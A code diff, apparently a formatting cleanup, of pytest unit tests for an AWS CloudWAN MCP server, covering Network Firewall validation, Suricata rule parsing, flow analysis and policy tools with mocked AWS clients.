     def mock_rule_group_response(self):
         """Mock rule group response with Suricata rules."""
@@ -82,88 +82,88 @@
                 }
             }
         }
-    
+
     def test_init(self, firewall_tools):
         """Test NetworkFirewallTools initialization."""
         assert firewall_tools is not None
-        assert hasattr(firewall_tools, 'config')
-    
+        assert hasattr(firewall_tools, "config")
+
     def test_validate_firewall_identifier_valid_arn(self, firewall_tools):
         """Test validation of valid firewall ARN."""
         valid_arn = "arn:aws:network-firewall:us-east-1:123456789012:firewall/test-firewall"
         # Should not raise exception
         firewall_tools._validate_firewall_identifier(valid_arn)
-    
+
     def test_validate_firewall_identifier_valid_name(self, firewall_tools):
         """Test validation of valid firewall name."""
         valid_name = "test-firewall-123"
         # Should not raise exception
         firewall_tools._validate_firewall_identifier(valid_name)
-    
+
     def test_validate_firewall_identifier_invalid_arn(self, firewall_tools):
         """Test validation of invalid firewall ARN."""
         invalid_arn = "arn:aws:invalid:format"
         with pytest.raises(ValueError, match="Invalid firewall ARN format"):
             firewall_tools._validate_firewall_identifier(invalid_arn)
-    
+
     def test_validate_firewall_identifier_invalid_name(self, firewall_tools):
         """Test validation of invalid firewall name."""
         invalid_name = "test@firewall!"
         with pytest.raises(ValueError, match="Invalid firewall name format"):
             firewall_tools._validate_firewall_identifier(invalid_name)
-    
+
     def test_validate_ip_address_valid(self, firewall_tools):
         """Test IP address validation with valid IPs."""
         valid_ips = ["10.0.1.1", "192.168.1.100", "2001:db8::1"]
         for ip in valid_ips:
             firewall_tools._validate_ip_address(ip)  # Should not raise
-    
+
     def test_validate_ip_address_invalid(self, firewall_tools):
         """Test IP address validation with invalid IPs."""
         invalid_ips = ["invalid", "256.1.1.1", "10.0.1"]
         for ip in invalid_ips:
             with pytest.raises(ValueError, match="Invalid IP address format"):
                 firewall_tools._validate_ip_address(ip)
-    
+
     def test_validate_port_valid(self, firewall_tools):
         """Test port validation with valid ports."""
         valid_ports = [1, 80, 443, 8080, 65535]
         for port in valid_ports:
             firewall_tools._validate_port(port)  # Should not raise
-    
+
     def test_validate_port_invalid(self, firewall_tools):
         """Test port validation with invalid ports."""
         invalid_ports = [0, -1, 65536, 100000]
         for port in invalid_ports:
             with pytest.raises(ValueError, match="Port must be between 1 and 65535"):
                 firewall_tools._validate_port(port)
-    
+
     def test_parse_suricata_rule_valid(self, firewall_tools):
         """Test parsing valid Suricata rule."""
-        rule = "alert tcp 10.0.0.0/8 any -> any 80 (msg:\"HTTP traffic\"; sid:1;)"
+        rule = 'alert tcp 10.0.0.0/8 any -> any 80 (msg:"HTTP traffic"; sid:1;)'
         parsed = firewall_tools._parse_suricata_rule(rule)
-        
+
         assert parsed.action == "alert"
         assert parsed.protocol == "tcp"
         assert parsed.src_ip == "10.0.0.0/8"
         assert parsed.dst_port == "80"
         assert parsed.parsed is True
         assert parsed.raw_rule == rule
-    
+
     def test_parse_suricata_rule_invalid(self, firewall_tools):
         """Test parsing invalid Suricata rule."""
         rule = "invalid rule format"
         parsed = firewall_tools._parse_suricata_rule(rule)
-        
+
         assert parsed.action == "unknown"
         assert parsed.protocol == "any"
         assert parsed.parsed is False
         assert parsed.raw_rule == rule
-    
+
     def test_check_five_tuple_match_protocol(self, firewall_tools):
         """Test 5-tuple matching with protocol check."""
         from awslabs.cloudwan_mcp_server.models.network_models import SuricataRule
-        
+
         rule = SuricataRule(
             action="alert",
             protocol="tcp",
@@ -172,34 +172,30 @@
             dst_ip="any",
             dst_port="80",
             raw_rule="test rule",
-            parsed=True
+            parsed=True,
         )
-        
+
         # Should match TCP traffic to port 80
-        assert firewall_tools._check_five_tuple_match(
-            rule, "10.0.1.1", "10.0.2.1", "tcp", 12345, 80
-        ) is True
-        
+        assert firewall_tools._check_five_tuple_match(rule, "10.0.1.1", "10.0.2.1", "tcp", 12345, 80) is True
+
         # Should not match UDP traffic
-        assert firewall_tools._check_five_tuple_match(
-            rule, "10.0.1.1", "10.0.2.1", "udp", 12345, 80
-        ) is False
-    
+        assert firewall_tools._check_five_tuple_match(rule, "10.0.1.1", "10.0.2.1", "udp", 12345, 80) is False
+
     def test_ip_matches_pattern_cidr(self, firewall_tools):
         """Test IP matching with CIDR patterns."""
         assert firewall_tools._ip_matches_pattern("10.0.1.100", "10.0.0.0/16") is True
         assert firewall_tools._ip_matches_pattern("192.168.1.100", "10.0.0.0/16") is False
-    
+
     def test_ip_matches_pattern_exact(self, firewall_tools):
         """Test IP matching with exact patterns."""
         assert firewall_tools._ip_matches_pattern("10.0.1.100", "10.0.1.100") is True
         assert firewall_tools._ip_matches_pattern("10.0.1.100", "10.0.1.101") is False
-    
+
     def test_port_matches_pattern_exact(self, firewall_tools):
         """Test port matching with exact patterns."""
         assert firewall_tools._port_matches_pattern(80, "80") is True
         assert firewall_tools._port_matches_pattern(80, "443") is False
-    
+
     def test_port_matches_pattern_range(self, firewall_tools):
         """Test port matching with range patterns."""
         assert firewall_tools._port_matches_pattern(8080, "8000:9000") is True
@@ -209,13 +205,13 @@
 @pytest.mark.asyncio
 class TestANFWToolFunctions:
     """Test suite for ANFW tool functions."""
-    
+
     @pytest.fixture
     def mock_firewall_clients(self):
         """Mock firewall and logs clients."""
         nfw_client = Mock()
         logs_client = Mock()
-        
+
         # Mock firewall response
         nfw_client.describe_firewall.return_value = {
             "Firewall": {
@@ -223,13 +219,11 @@
                 "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/test-firewall",
                 "VpcId": "vpc-12345",
                 "SubnetMappings": [{"SubnetId": "subnet-12345"}],
-                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy"
+                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy",
             },
-            "FirewallStatus": {
-                "Status": "READY"
-            }
+            "FirewallStatus": {"Status": "READY"},
         }
-        
+
         # Mock policy response
         nfw_client.describe_firewall_policy.return_value = {
             "FirewallPolicy": {
@@ -238,19 +232,19 @@
                     {"ResourceArn": "arn:aws:network-firewall:us-east-1:123456789012:stateful-rulegroup/test-stateful"}
                 ],
                 "StatelessDefaultActions": ["aws:pass"],
-                "StatelessFragmentDefaultActions": ["aws:drop"]
+                "StatelessFragmentDefaultActions": ["aws:drop"],
             }
         }
-        
+
         # Mock rule group response
         nfw_client.describe_rule_group.return_value = {
             "RuleGroup": {
                 "RulesSource": {
-                    "RulesString": "alert tcp any any -> any 80 (msg:\"HTTP traffic detected\"; sid:1; rev:1;)"
+                    "RulesString": 'alert tcp any any -> any 80 (msg:"HTTP traffic detected"; sid:1; rev:1;)'
                 }
             }
         }
-        
+
         # Mock logging configuration
         nfw_client.describe_logging_configuration.return_value = {
             "LoggingConfiguration": {
@@ -258,14 +252,12 @@
                     {
                         "LogType": "FLOW",
                         "LogDestinationType": "CloudWatchLogs",
-                        "LogDestination": {
-                            "logGroup": "/aws/network-firewall/test-firewall"
-                        }
+                        "LogDestination": {"logGroup": "/aws/network-firewall/test-firewall"},
                     }
                 ]
             }
         }
-        
+
         # Mock CloudWatch Logs responses
         logs_client.start_query.return_value = {"queryId": "test-query-123"}
         logs_client.get_query_results.return_value = {
@@ -273,181 +265,205 @@
             "results": [
                 [
                     {"field": "@timestamp", "value": "2023-01-01T12:00:00.000Z"},
-                    {"field": "@message", "value": "FLOW srcaddr=10.0.1.100 dstaddr=10.0.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW"}
+                    {
+                        "field": "@message",
+                        "value": "FLOW srcaddr=10.0.1.100 dstaddr=10.0.2.200 srcport=12345 dstport=80 protocol=6 action=ALLOW",
+                    },
                 ]
-            ]
+            ],
         }
-        
+
         return nfw_client, logs_client
-    
+
     async def test_monitor_anfw_logs_success(self, mock_firewall_clients):
         """Test successful ANFW log monitoring."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=logs_client):
-            
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+                return_value=logs_client,
+            ),
+        ):
             result = await monitor_anfw_logs("test-firewall", "flow", 60)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert parsed_result["firewall_name"] == "test-firewall"
             assert "log_entries" in parsed_result
             assert "analysis" in parsed_result
-    
+
     async def test_monitor_anfw_logs_invalid_firewall_name(self):
         """Test log monitoring with invalid firewall name."""
         result = await monitor_anfw_logs("invalid@name!", "flow", 60)
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Invalid firewall name format" in parsed_result["error"]
-    
+
     async def test_monitor_anfw_logs_invalid_log_type(self):
         """Test log monitoring with invalid log type."""
         result = await monitor_anfw_logs("test-firewall", "invalid", 60)
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "log_type must be 'flow' or 'alert'" in parsed_result["error"]
-    
+
     async def test_monitor_anfw_logs_invalid_time_range(self):
         """Test log monitoring with invalid time range."""
         result = await monitor_anfw_logs("test-firewall", "flow", 2000)  # > 1440 minutes
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "time_range_minutes must be between 1 and 1440" in parsed_result["error"]
-    
+
     async def test_analyze_anfw_policy_success(self, mock_firewall_clients):
         """Test successful ANFW policy analysis."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
             result = await analyze_anfw_policy("test-firewall", True)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "analysis" in parsed_result
             assert "firewall_details" in parsed_result["analysis"]
             assert "policy_summary" in parsed_result["analysis"]
             assert "security_recommendations" in parsed_result["analysis"]
-    
+
     async def test_analyze_anfw_policy_invalid_identifier(self):
         """Test policy analysis with invalid identifier."""
         result = await analyze_anfw_policy("invalid@name!")
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Invalid firewall name format" in parsed_result["error"]
-    
+
     async def test_analyze_five_tuple_flow_success(self, mock_firewall_clients):
         """Test successful 5-tuple flow analysis."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
-            result = await analyze_five_tuple_flow(
-                "test-firewall", "10.0.1.100", "10.0.2.200", "TCP", 12345, 80
-            )
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
+            result = await analyze_five_tuple_flow("test-firewall", "10.0.1.100", "10.0.2.200", "TCP", 12345, 80)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "flow_analysis" in parsed_result
             assert "flow_details" in parsed_result["flow_analysis"]
             assert "policy_evaluation" in parsed_result["flow_analysis"]
-    
+
     async def test_analyze_five_tuple_flow_invalid_ip(self):
         """Test 5-tuple flow analysis with invalid IP."""
-        result = await analyze_five_tuple_flow(
-            "test-firewall", "invalid-ip", "10.0.2.200", "TCP", 12345, 80
-        )
+        result = await analyze_five_tuple_flow("test-firewall", "invalid-ip", "10.0.2.200", "TCP", 12345, 80)
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Invalid IP address format" in parsed_result["error"]
-    
+
     async def test_analyze_five_tuple_flow_invalid_port(self):
         """Test 5-tuple flow analysis with invalid port."""
         result = await analyze_five_tuple_flow(
-            "test-firewall", "10.0.1.100", "10.0.2.200", "TCP", 70000, 80  # Invalid port > 65535
+            "test-firewall",
+            "10.0.1.100",
+            "10.0.2.200",
+            "TCP",
+            70000,
+            80,  # Invalid port > 65535
         )
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Port must be between 1 and 65535" in parsed_result["error"]
-    
+
     async def test_analyze_five_tuple_flow_invalid_protocol(self):
         """Test 5-tuple flow analysis with invalid protocol."""
-        result = await analyze_five_tuple_flow(
-            "test-firewall", "10.0.1.100", "10.0.2.200", "INVALID", 12345, 80
-        )
+        result = await analyze_five_tuple_flow("test-firewall", "10.0.1.100", "10.0.2.200", "INVALID", 12345, 80)
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Protocol must be TCP, UDP, or ICMP" in parsed_result["error"]
-    
+
     async def test_parse_suricata_rules_success(self, mock_firewall_clients):
         """Test successful Suricata rule parsing."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
             result = await parse_suricata_rules("test-firewall", True)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "parsed_rules" in parsed_result
             assert "l7_analysis" in parsed_result
             assert "recommendations" in parsed_result
-    
+
     async def test_parse_suricata_rules_invalid_firewall(self):
         """Test Suricata rule parsing with invalid firewall identifier."""
         result = await parse_suricata_rules("invalid@firewall!")
         parsed_result = json.loads(result)
-        
+
         assert parsed_result["success"] is False
         assert "Invalid firewall name format" in parsed_result["error"]
-    
+
     async def test_simulate_policy_changes_success(self, mock_firewall_clients):
         """Test successful policy change simulation."""
         nfw_client, logs_client = mock_firewall_clients
-        
+
         test_flows = ["10.0.1.100:12345->10.0.2.200:80/TCP"]
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
-            result = await simulate_policy_changes(
-                "test-firewall", "Add deny rule for SSH traffic", test_flows
-            )
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
+            result = await simulate_policy_changes("test-firewall", "Add deny rule for SSH traffic", test_flows)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "simulation_result" in parsed_result
             assert "impact_analysis" in parsed_result["simulation_result"]
-    
+
     async def test_simulate_policy_changes_invalid_flow_format(self, mock_firewall_clients):
         """Test policy simulation with invalid flow format."""
         nfw_client, logs_client = mock_firewall_clients
-        
+
         test_flows = ["invalid-flow-format"]
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
-            result = await simulate_policy_changes(
-                "test-firewall", "Test policy change", test_flows
-            )
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
+            result = await simulate_policy_changes("test-firewall", "Test policy change", test_flows)
             parsed_result = json.loads(result)
-            
+
             # Should still succeed but with warnings about invalid flows
             assert parsed_result["success"] is True
-    
+
     async def test_simulate_policy_changes_default_flows(self, mock_firewall_clients):
         """Test policy simulation with default test flows."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=nfw_client,
+        ):
             result = await simulate_policy_changes(
-                "test-firewall", "Test policy change"  # No test_flows provided
+                "test-firewall",
+                "Test policy change",  # No test_flows provided
             )
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert parsed_result["simulation_result"]["impact_analysis"]["flows_analyzed"] == 4  # Default flows
 
@@ -455,50 +471,55 @@
 @pytest.mark.asyncio
 class TestANFWErrorHandling:
     """Test suite for ANFW error handling scenarios."""
-    
+
     async def test_monitor_anfw_logs_client_error(self):
         """Test log monitoring with AWS client error."""
         mock_client = Mock()
         mock_client.start_query.side_effect = ClientError(
-            error_response={'Error': {'Code': 'AccessDenied', 'Message': 'Access denied'}},
-            operation_name='StartQuery'
+            error_response={"Error": {"Code": "AccessDenied", "Message": "Access denied"}}, operation_name="StartQuery"
         )
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client', return_value=mock_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_logs_client",
+            return_value=mock_client,
+        ):
             result = await monitor_anfw_logs("test-firewall", "flow", 60)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is False
             assert "error_code" in parsed_result
-    
+
     async def test_analyze_anfw_policy_firewall_not_found(self):
         """Test policy analysis with firewall not found."""
         mock_client = Mock()
         mock_client.describe_firewall.side_effect = ClientError(
-            error_response={'Error': {'Code': 'ResourceNotFoundException', 'Message': 'Firewall not found'}},
-            operation_name='DescribeFirewall'
+            error_response={"Error": {"Code": "ResourceNotFoundException", "Message": "Firewall not found"}},
+            operation_name="DescribeFirewall",
         )
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=mock_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=mock_client,
+        ):
             result = await analyze_anfw_policy("nonexistent-firewall")
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is False
             assert parsed_result["error_code"] == "ResourceNotFoundException"
-    
+
     async def test_parse_suricata_rules_rule_group_not_found(self):
         """Test Suricata parsing with rule group not found."""
         mock_client = Mock()
-        
+
         # Mock successful firewall and policy calls
         mock_client.describe_firewall.return_value = {
             "Firewall": {
                 "FirewallName": "test-firewall",
                 "FirewallArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall/test-firewall",
-                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy"
+                "FirewallPolicyArn": "arn:aws:network-firewall:us-east-1:123456789012:firewall-policy/test-policy",
             }
         }
-        
+
         mock_client.describe_firewall_policy.return_value = {
             "FirewallPolicy": {
                 "StatefulRuleGroups": [
@@ -506,55 +527,64 @@
                 ]
             }
         }
-        
+
         # Mock rule group not found
         mock_client.describe_rule_group.side_effect = ClientError(
-            error_response={'Error': {'Code': 'ResourceNotFoundException', 'Message': 'Rule group not found'}},
-            operation_name='DescribeRuleGroup'
+            error_response={"Error": {"Code": "ResourceNotFoundException", "Message": "Rule group not found"}},
+            operation_name="DescribeRuleGroup",
         )
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=mock_client):
+
+        with patch(
+            "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+            return_value=mock_client,
+        ):
             result = await parse_suricata_rules("test-firewall")
             parsed_result = json.loads(result)
-            
+
             # Should succeed but with empty rules (graceful handling)
             assert parsed_result["success"] is True
             assert len(parsed_result["parsed_rules"]) == 0
 
 
-@pytest.mark.asyncio 
+@pytest.mark.asyncio
 class TestANFWIntegration:
     """Test suite for ANFW integration scenarios."""
-    
+
     async def test_anfw_cloudwan_integration(self, mock_firewall_clients):
         """Test ANFW integration with CloudWAN compliance analysis."""
         nfw_client, logs_client = mock_firewall_clients
-        
+
         # Mock successful core network tools import
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.core_network.CoreNetworkTools') as mock_core_tools:
-            
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch("awslabs.cloudwan_mcp_server.tools.core_network.CoreNetworkTools") as mock_core_tools,
+        ):
             result = await analyze_anfw_policy("test-firewall", include_compliance_check=True)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "cloudwan_compliance" in parsed_result["analysis"]
-    
+
     async def test_anfw_path_tracing_integration(self, mock_firewall_clients):
         """Test ANFW integration with path tracing functionality."""
         nfw_client, logs_client = mock_firewall_clients
-        
-        with patch('awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client', return_value=nfw_client), \
-             patch('awslabs.cloudwan_mcp_server.tools.network_analysis.NetworkAnalysisTools') as mock_analysis_tools:
-            
-            result = await analyze_five_tuple_flow(
-                "test-firewall", "10.0.1.100", "10.0.2.200", "TCP", 12345, 80
-            )
+
+        with (
+            patch(
+                "awslabs.cloudwan_mcp_server.tools.network_firewall.firewall_tools.get_network_firewall_client",
+                return_value=nfw_client,
+            ),
+            patch("awslabs.cloudwan_mcp_server.tools.network_analysis.NetworkAnalysisTools") as mock_analysis_tools,
+        ):
+            result = await analyze_five_tuple_flow("test-firewall", "10.0.1.100", "10.0.2.200", "TCP", 12345, 80)
             parsed_result = json.loads(result)
-            
+
             assert parsed_result["success"] is True
             assert "path_integration" in parsed_result["flow_analysis"]
 
 
 if __name__ == "__main__":
-    pytest.main([__file__])
\ No newline at end of file
+    pytest.main([__file__])

--- cloudwan-mcp-server/tests/unit/test_network_tools.py
+++ cloudwan-mcp-server/tests/unit/test_network_tools.py
@@ -38,18 +38,14 @@
         "public_ipv4": "8.8.8.8",
         "loopback": "127.0.0.1",
         "multicast": "224.0.0.1",
-        "invalid": "invalid_ip"
+        "invalid": "invalid_ip",
     }
 
 
 @pytest.fixture
 def mock_cidr_blocks():
     """Mock CIDR blocks fixture with realistic test data."""
-    return {
-        "valid_ipv4": "10.0.0.0/16",
-        "single_host": "192.168.1.100/32",
-        "invalid": "invalid_cidr"
-    }
+    return {"valid_ipv4": "10.0.0.0/16", "single_host": "192.168.1.100/32", "invalid": "invalid_cidr"}
 
 
 @pytest.fixture
@@ -65,7 +61,7 @@
                 "State": "available",
                 "CidrBlock": "10.0.0.0/16",
                 "IsDefault": False,
-                "Tags": [{"Key": "Name", "Value": "test-vpc"}]
+                "Tags": [{"Key": "Name", "Value": "test-vpc"}],
             }
         ]
     }
@@ -77,23 +73,15 @@
                 "GlobalNetworkId": "global-network-1234567890abcdef0",
                 "State": "AVAILABLE",
                 "Description": "Test global network",
-                "CreatedAt": "2023-01-01T00:00:00Z"
+                "CreatedAt": "2023-01-01T00:00:00Z",
             }
         ]
     }
 
     client.list_network_function_groups.return_value = {
         "NetworkFunctionGroups": [
-            {
-                "Name": "production-nfg",
-                "Status": "available",
-                "CreatedAt": "2023-01-01T00:00:00Z"
-            },
-            {
-                "Name": "staging-nfg",
-                "Status": "available",
-                "CreatedAt": "2023-01-01T00:00:00Z"
-            }
+            {"Name": "production-nfg", "Status": "available", "CreatedAt": "2023-01-01T00:00:00Z"},
+            {"Name": "staging-nfg", "Status": "available", "CreatedAt": "2023-01-01T00:00:00Z"},
         ]
     }
 
@@ -103,7 +91,7 @@
 @pytest.fixture
 def mock_get_aws_client(mock_aws_client):
     """Mock the get_aws_client function."""
-    with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', return_value=mock_aws_client) as mock:
+    with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", return_value=mock_aws_client) as mock:
         yield mock
 
 
@@ -247,10 +235,7 @@
     @pytest.mark.asyncio
     async def test_trace_network_path_invalid_source(self, mock_ip_addresses):
         """Test network path tracing with invalid source IP."""
-        result = await trace_network_path(
-            mock_ip_addresses["invalid"],
-            mock_ip_addresses["valid_ipv4"]
-        )
+        result = await trace_network_path(mock_ip_addresses["invalid"], mock_ip_addresses["valid_ipv4"])
         response = json.loads(result)
 
         assert response["success"] is False
@@ -259,10 +244,7 @@
     @pytest.mark.asyncio
     async def test_trace_network_path_invalid_destination(self, mock_ip_addresses):
         """Test network path tracing with invalid destination IP."""
-        result = await trace_network_path(
-            mock_ip_addresses["valid_ipv4"],
-            mock_ip_addresses["invalid"]
-        )
+        result = await trace_network_path(mock_ip_addresses["valid_ipv4"], mock_ip_addresses["invalid"])
         response = json.loads(result)
 
         assert response["success"] is False
@@ -270,7 +252,7 @@
 
     @pytest.mark.asyncio
     async def test_discover_vpcs_default_region(self, mock_get_aws_client):
-        with patch.dict(os.environ, {'AWS_DEFAULT_REGION': 'eu-west-1'}):
+        with patch.dict(os.environ, {"AWS_DEFAULT_REGION": "eu-west-1"}):
             result = await discover_vpcs()
             response = json.loads(result)
 
@@ -289,7 +271,7 @@
         tools_and_args = [
             (list_core_networks, ["us-east-1"]),
             (discover_vpcs, ["us-east-1"]),
-            (get_global_networks, ["us-east-1"])
+            (get_global_networks, ["us-east-1"]),
         ]
 
         for tool_func, args in tools_and_args:

--- cloudwan-mcp-server/tests/unit/test_policy_tools.py
+++ cloudwan-mcp-server/tests/unit/test_policy_tools.py
@@ -14,6 +14,7 @@
 
 
 """Unit tests for CloudWAN policy tools."""
+
 import json
 import pytest
 from botocore.exceptions import ClientError
@@ -28,36 +29,26 @@
         "core-network-configuration": {
             "vpn-ecmp-support": False,
             "asn-ranges": ["64512-65534"],
-            "edge-locations": [
-                {
-                    "location": "us-east-1",
-                    "asn": 64512
-                }
-            ]
+            "edge-locations": [{"location": "us-east-1", "asn": 64512}],
         },
         "segments": [
-            {
-                "name": "production",
-                "require-attachment-acceptance": False,
-                "isolate-attachments": False
-            },
-            {
-                "name": "development",
-                "require-attachment-acceptance": True,
-                "isolate-attachments": True
-            }
-        ]
+            {"name": "production", "require-attachment-acceptance": False, "isolate-attachments": False},
+            {"name": "development", "require-attachment-acceptance": True, "isolate-attachments": True},
+        ],
     }
 
+
 @pytest.fixture
 def mock_aws_client():
     """Mock AWS client fixture."""
     client = Mock()
     return client
 
+
 @pytest.fixture
 def mock_get_aws_client():
     """Mock the get_aws_client function with NetworkManager responses."""
+
     def _mock_client(service, region=None):
         client = Mock()
 
@@ -68,46 +59,34 @@
                     "PolicyVersionId": 1,
                     "PolicyDocument": {
                         "version": "2021.12",
-                        "core-network-configuration": {
-                            "vpn-ecmp-support": False,
-                            "asn-ranges": ["64512-65534"]
-                        },
-                        "segments": [
-                            {"name": "production", "require-attachment-acceptance": False}
-                        ]
+                        "core-network-configuration": {"vpn-ecmp-support": False, "asn-ranges": ["64512-65534"]},
+                        "segments": [{"name": "production", "require-attachment-acceptance": False}],
                     },
                     "Description": "Test policy",
-                    "CreatedAt": "2023-01-01T00:00:00Z"
+                    "CreatedAt": "2023-01-01T00:00:00Z",
                 }
             }
 
             # Mock change set response
             client.get_core_network_change_set.return_value = {
                 "CoreNetworkChanges": [
-                    {
-                        "Type": "SEGMENT_MAPPING_CREATE",
-                        "Action": "CREATE",
-                        "Identifier": "segment-mapping-1"
-                    }
+                    {"Type": "SEGMENT_MAPPING_CREATE", "Action": "CREATE", "Identifier": "segment-mapping-1"}
                 ]
             }
 
             # Mock change events response
             client.get_core_network_change_events.return_value = {
                 "CoreNetworkChangeEvents": [
-                    {
-                        "Type": "POLICY_VERSION_CREATED",
-                        "Status": "COMPLETED",
-                        "EventTime": "2023-01-01T00:00:00Z"
-                    }
+                    {"Type": "POLICY_VERSION_CREATED", "Status": "COMPLETED", "EventTime": "2023-01-01T00:00:00Z"}
                 ]
             }
 
         return client
 
-    with patch('awslabs.cloudwan_mcp_server.server.get_aws_client', side_effect=_mock_client) as mock:
+    with patch("awslabs.cloudwan_mcp_server.server.get_aws_client", side_effect=_mock_client) as mock:
         yield mock
 
+
 class TestPolicyTools:
     """Test CloudWAN policy management tools."""
 
@@ -179,8 +158,7 @@
         # Mock client error
         mock_client = Mock()
         mock_client.get_core_network_policy.side_effect = ClientError(
-            {"Error": {"Code": "ResourceNotFound", "Message": "Core network not found"}},
-            "GetCoreNetworkPolicy"
+            {"Error": {"Code": "ResourceNotFound", "Message": "Core network not found"}}, "GetCoreNetworkPolicy"
         )
         mock_get_aws_client.return_value = mock_client
 

--- cloudwan-mcp-server/tests/unit/test_server_utils.py
+++ cloudwan-mcp-server/tests/unit/test_server_utils.py
@@ -35,8 +35,8 @@
         _create_client.cache_clear()  # Clear cache to force client creation
 
         # Clear AWS_PROFILE to avoid session creation
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-west-2', 'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-west-2", "AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 client = get_aws_client("networkmanager")
@@ -50,8 +50,8 @@
         """Test AWS client creation with explicit region."""
         _create_client.cache_clear()  # Clear cache to force client creation
 
-        with patch.dict('os.environ', {'AWS_PROFILE': ''}, clear=True):
-            with patch('boto3.client') as mock_client:
+        with patch.dict("os.environ", {"AWS_PROFILE": ""}, clear=True):
+            with patch("boto3.client") as mock_client:
                 mock_client.return_value = Mock()
 
                 client = get_aws_client("ec2", "eu-central-1")
@@ -65,8 +65,8 @@
         """Test AWS client creation with AWS profile."""
         _create_client.cache_clear()  # Clear cache to force client creation
 
-        with patch.dict('os.environ', {'AWS_PROFILE': 'test-profile'}):
-            with patch('boto3.Session') as mock_session:
+        with patch.dict("os.environ", {"AWS_PROFILE": "test-profile"}):
+            with patch("boto3.Session") as mock_session:
                 mock_session_instance = Mock()
                 mock_session.return_value = mock_session_instance
                 mock_session_instance.client.return_value = Mock()
@@ -80,8 +80,8 @@
         """Test AWS client caching functionality."""
         _create_client.cache_clear()  # Clear cache to start clean
 
